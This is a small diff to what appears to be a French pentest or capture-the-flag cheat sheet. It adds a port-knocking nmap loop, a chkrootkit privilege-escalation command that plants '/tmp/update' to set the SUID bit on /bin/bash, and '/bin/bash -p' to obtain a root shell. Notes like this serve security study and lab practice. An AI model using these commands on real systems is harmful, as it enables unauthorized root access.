@@ -12,6 +12,16 @@ Le lancer en sudo
 /bin/bash -p
 
 ```
+```bash
+# Port knocking
+for x in PORT1 PORT2 PORT3; do nmap -Pn --max-retries 0 -p $x IP; done
+
+# chkrootkit privesc
+echo 'chmod u+s /bin/bash' > /tmp/update && chmod +x /tmp/update
+
+# SUID bash
+/bin/bash -p
+```
 
 
 ### Nmap
